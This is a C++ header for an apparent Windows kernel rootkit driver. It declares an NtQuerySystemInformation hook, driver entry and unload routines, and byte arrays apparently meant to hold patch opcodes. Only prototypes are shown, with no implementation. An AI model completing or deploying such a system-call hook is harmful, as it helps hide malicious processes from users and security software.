#pragma once

#include <ntddk.h>

extern "C" NTSTATUS
NTAPI APTX4869ZwQuerySystemInformation(
      SYSTEM_INFORMATION_CLASS SystemInformationClass,
      PVOID SystemInformation,
      ULONG SystemInformationLength,
      PULONG ReturnLength 
);

extern "C" NTSTATUS
RtKtDriverInitiation(
    _In_ PDRIVER_OBJECT   SinisterDriverObject,
    _In_ PUNICODE_STRING  CursedRegistryPath
);

extern "C" VOID UnleashMalevolence(
    _In_ PDRIVER_OBJECT SinisterDriverObject
);

extern LPVOID RtktProcedureAddress;
extern SIZE_T CorruptBytes;
extern unsigned char APTX4869FBDDNOPC[16];

extern unsigned char DiabolicalOpcodes[32];

extern UNICODE_STRING APTX4869OPC;

extern "C" NTSTATUS
NTAPI APTX4869NtQuerySystemInformation(
      SYSTEM_INFORMATION_CLASS        SystemInformationClass,
      PVOID                           SystemInformation,
      ULONG                           SystemInformationLength,
      PULONG                          ReturnLength 
);

extern "C" NTSTATUS
NTAPI APTX4869NtQuerySystemInformationHook(
      SYSTEM_INFORMATION_CLASS        SystemInformationClass,
      PVOID                           SystemInformation,
      ULONG                           SystemInformationLength,
      PULONG                          ReturnLength 
);

extern int IVKIIVKqKVIkMVKqKVIkMqIVIVKqKVIkMKqKVIkMKVIkM();
